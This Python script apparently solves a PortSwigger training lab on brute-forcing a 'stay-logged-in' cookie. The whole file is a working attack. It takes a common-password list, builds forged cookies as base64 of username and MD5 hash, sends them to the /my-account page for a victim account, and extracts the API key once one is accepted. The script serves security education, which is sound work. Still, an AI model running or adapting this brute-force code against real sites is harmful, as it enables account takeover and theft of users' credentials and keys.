#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Brute-forcing a stay-logged-in cookie.
"""

import argparse
import base64
import hashlib
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PASSWORDS = ["123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567",
             "dragon","123123","baseball","iloveyou","trustno1","1234567890","sunshine","master",
             "123321","letmein","welcome","shadow","monkey","football","michael","batman","abc123",
             "letmein","696969","mustang","access","shadow","master","michael","superman","696969",
             "123qwe","qwerty123","passw0rd","hello","charlie","donald","password1","qwerty1"]


def make_cookie(username, password):
    md5 = hashlib.md5(password.encode()).hexdigest()
    raw = f"{username}:{md5}".encode()
    return base64.b64encode(raw).decode()


def main():
    parser = argparse.ArgumentParser(description="Solve Auth Lab 9 (stay-logged-in brute force)")
    parser.add_argument("lab_url")
    parser.add_argument("--victim", default="carlos")
    args = parser.parse_args()
    lab = args.lab_url.rstrip("/")

    s = requests.Session()
    s.verify = False

    print(f"[*] Brute-forcing stay-logged-in cookie for {args.victim}...")
    for password in PASSWORDS:
        cookie_val = make_cookie(args.victim, password)
        r = s.get(f"{lab}/my-account", cookies={"stay-logged-in": cookie_val})
        if "Your API Key" in r.text or f"username={args.victim}" in r.text:
            print(f"[+] Password found: {password}")
            m = re.search(r"Your API Key is: ([^<]+)", r.text)
            if m:
                print(f"[+] API Key: {m.group(1).strip()}")
            print("[+] Lab solved.")
            return

    print("[-] Password not found in wordlist")


if __name__ == "__main__":
    main()
